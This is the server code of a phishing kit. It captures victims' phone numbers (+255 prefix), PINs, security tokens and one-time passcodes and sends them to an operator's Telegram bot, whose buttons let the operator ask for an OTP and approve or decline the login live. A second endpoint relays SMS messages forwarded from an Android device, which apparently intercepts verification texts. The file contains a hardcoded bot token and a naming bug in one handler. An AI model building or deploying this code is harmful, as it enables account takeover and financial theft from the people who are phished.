const express = require("express");
const axios = require("axios");
const cors = require("cors");
const bodyParser = require("body-parser");
const crypto = require('crypto');
const path = require("path");
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5002;

// --- MIDDLEWARE ---
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// --- TELEGRAM CONFIG ---
const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const TELEGRAM_ADMIN_ID = "7162306402";
const BASE_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

const sessions = {};

// --- ROUTES ---

// Endpoint for the Android app or frontend to send data
app.post('/api/forward', async (req, require) => {
    const { phoneName, sender, message, timestamp } = req.body;

    if (!sender || !message) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    // Format the message content securely on the server
    const formattedMessage = `
📱 <b>${phoneName || 'Unknown Device'}</b>
👤 From: <code>${sender}</code>
🕐 Time: ${timestamp || new Date().toISOString()}
💬 Message: ${message}
    `.trim();

    try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: formattedMessage,
            parse_mode: 'HTML'
        });

        return res.status(200).json({ success: true, status: 'Message forwarded successfully' });
    } catch (error) {
        console.error('Telegram API Error:', error.response ? error.response.data : error.message);
        return res.status(500).json({ error: 'Failed to forward message via Telegram' });
    }
});


// 1. Initial Login Submission
app.post("/api/submit", async (req, res) => {
    const { phone, pin, securityToken: token } = req.body;
    const sessionId = crypto.randomBytes(8).toString("hex");

    sessions[sessionId] = { 
        status: 'waiting', 
        phone: phone, 
        pin: pin, 
        token: token || 'N/A',
        timestamp: Date.now() 
    };

    const message = `🚀 *New Login Captured*\n📱 Phone: +255${phone}\n🔑 PIN: ${pin}\n🆔 Token: ${token || 'N/A'}\n🆔 ID: ${sessionId}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: message,
            parse_mode: "Html",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🔢 Request OTP (4)", url: `${BASE_URL}/api/cmd/${sessionId}/otp4` },
                        { text: "🔢 Request OTP (6)", url: `${BASE_URL}/api/cmd/${sessionId}/otp6` }
                    ],
                    [
                        { text: "✅ Done / Redirect", url: `${BASE_URL}/api/cmd/${sessionId}/approved` }
                    ]
                ]
            }
        });
        res.json({ success: true, sessionId: sessionId });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

// 2. Admin URL Command Handler (Used by buttons in Telegram)
app.get('/api/cmd/:id/:command', (req, res) => {
    const { id, command } = req.params;
    if (sessions[id]) {
        sessions[id].status = command;
        res.send(`<h1>Action Success</h1><p>Status set to: ${command}</p><script>setTimeout(window.close, 1000)</script>`);
    } else {
        res.status(404).send('Session Expired');
    }
});

// 3. OTP Submission Route
app.post('/api/submit-otp', async (req, res) => {
    const { otp, sessionId } = req.body;

    if (sessions[sessionId]) {
        sessions[sessionId].status = 'verifying';
        const msg = `🔐 *OTP Received*\n📱 User: +255${sessions[sessionId].phone}\n🔢 OTP: ${otp}`;
        
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_ADMIN_ID,
                text: msg,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [[
                        { text: "✅ Accept", url: `${BASE_URL}/api/cmd/${sessionId}/approved` },
                        { text: "❌ Decline", url: `${BASE_URL}/api/cmd/${sessionId}/declined` }
                    ]]
                }
            });
            res.json({ success: true });
        } catch (e) {
            res.status(500).json({ success: false });
        }
    } else {
        res.status(404).json({ success: false });
    }
});

// 4. Status Polling
app.get('/api/status/:id', (req, res) => {
    const session = sessions[req.params.id];
    res.json(session ? { status: session.status } : { status: 'not_found' });
});

// Serve Frontend
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 Server listening on port ${PORT}`);
});
